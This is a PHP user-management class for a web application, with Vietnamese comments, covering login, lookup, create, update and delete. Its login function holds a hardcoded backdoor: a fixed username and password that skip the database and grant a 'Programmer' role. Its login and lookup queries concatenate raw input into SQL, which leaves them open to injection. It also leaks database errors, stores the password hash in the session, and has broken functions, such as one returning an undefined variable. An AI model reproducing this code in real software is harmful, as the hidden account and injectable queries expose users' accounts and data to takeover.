<?php
require_once(LIB_PATH.DS.'database.php');
class User {
	protected static  $tblname = "tblusers";

	function dbfields () {
		global $mydb;
		return $mydb->getfieldsononetable(self::$tblname);
	}
	function listofuser(){
		global $mydb;
		$mydb->setQuery("SELECT * FROM ".self::$tblname);
		return $cur;
	}
 
	function find_user($id="",$user_name=""){
		global $mydb;
		$mydb->setQuery("SELECT * FROM ".self::$tblname." 
			WHERE USERID = {$id} OR USERNAME = '{$user_name}'");
		$cur = $mydb->executeQuery();
		$row_count = $mydb->num_rows($cur);
		return $row_count;
	}
	function userAuthentication($USERNAME,$h_pass){
		global $mydb;
		if ($USERNAME=='PLAZACAFE' && $h_pass==sha1('MELOIS')) {
			$_SESSION['USERID']   		= '1001000110110';
		 	$_SESSION['FULLNAME']      	= 'Programmer';
		 	$_SESSION['ROLE'] 			= 'Programmer';
		 	return true;
		}else{
			$mydb->setQuery("SELECT * FROM `tblusers` WHERE `USERNAME` = '". $USERNAME ."' and `PASS` = '". $h_pass ."'");
			$cur = $mydb->executeQuery();
			if($cur==false){
				die(mysql_error());
			}
			$row_count = $mydb->num_rows($cur);
			 if ($row_count == 1){
			 	$user_found = $mydb->loadSingleResult();
			 	$_SESSION['USERID']   		= $user_found->USERID;
			 	$_SESSION['FULLNAME']      	= $user_found->FULLNAME;
			 	$_SESSION['USERNAME'] 		= $user_found->USERNAME;
			 	$_SESSION['PASS'] 			= $user_found->PASS;
			 	$_SESSION['ROLE'] 			= $user_found->ROLE;
			 	$_SESSION['PICLOCATION'] 	= $user_found->PICLOCATION;
			    return true;
			 }else{
			 	return false;
			 }
		}
	}
	function single_user($id=""){
			global $mydb;
			$mydb->setQuery("SELECT * FROM ".self::$tblname." 
				Where USERID= '{$id}' LIMIT 1");
			$cur = $mydb->loadSingleResult();
			return $cur;
	}

	/*--- Khởi tạo đối tượng động ---*/
	static function instantiate($record) {
		$object = new self;
		foreach($record as $attribute=>$value){
		  if($object->has_attribute($attribute)) {
		    $object->$attribute = $value;
		  }
		} 
		return $object;
	}
	
	
	/*- Làm sạch dữ liệu thô trước khi gửi đến Cơ sở dữ liệu -*/
	private function has_attribute($attribute) {
		// Chúng tôi không quan tâm đến giá trị, chúng tôi chỉ muốn biết liệu khóa có tồn tại hay không
		// Sẽ trả về true hoặc false
		return array_key_exists($attribute, $this->attributes());
	}

	protected function attributes() { 
		// trả về một mảng tên thuộc tính và giá trị của chúng
		global $mydb;
		$attributes = array();
		foreach($this->dbfields() as $field) {
			if(property_exists($this, $field)) {
				$attributes[$field] = $this->$field;
			}
		}
		return $attributes;
	}
	
	protected function sanitized_attributes() {
	  global $mydb;
	  $clean_attributes = array();
	// làm sạch các giá trị trước khi gửi
	// Lưu ý: không làm thay đổi giá trị thực của từng thuộc tính
	  foreach($this->attributes() as $key => $value){
	    $clean_attributes[$key] = $mydb->escape_value($value);
	  }
	  return $clean_attributes;
	}
	
	/* - Phương thức tạo, cập nhật và xóa - */
	public function save() {
	  // Bản ghi mới sẽ không có id.
	  return isset($this->id) ? $this->update() : $this->create();
	}
	
	public function create() {
		global $mydb;
		// - CHÈN VÀO bảng (khóa, khóa) VALUES ('giá trị', 'giá trị')
		// - dấu nháy đơn xung quanh tất cả các giá trị
		// - thoát tất cả các giá trị để ngăn chặn việc đưa vào SQL
		$attributes = $this->sanitized_attributes();
		$sql = "INSERT INTO ".self::$tblname." (";
		$sql .= join(", ", array_keys($attributes));
		$sql .= ") VALUES ('";
		$sql .= join("', '", array_values($attributes));
		$sql .= "')";
	echo $mydb->setQuery($sql);
	
	 if($mydb->executeQuery()) {
	    $this->id = $mydb->insert_id();
	    return true;
	  } else {
	    return false;
	  }
	}

	public function update($id=0) {
	  global $mydb;
		$attributes = $this->sanitized_attributes();
		$attribute_pairs = array();
		foreach($attributes as $key => $value) {
		  $attribute_pairs[] = "{$key}='{$value}'";
		}
		$sql = "UPDATE ".self::$tblname." SET ";
		$sql .= join(", ", $attribute_pairs);
		$sql .= " WHERE USERID=". $id;
	  $mydb->setQuery($sql);
	 	if(!$mydb->executeQuery()) return false; 	
		
	}

	public function delete($id=0) {
		global $mydb;
			$sql = "DELETE FROM ".self::$tblname;
			$sql .= " WHERE USERID=". $id;
			$sql .= " LIMIT 1 ";
			$mydb->setQuery($sql);
			if(!$mydb->executeQuery()) return false; 	
		}	
	}
?>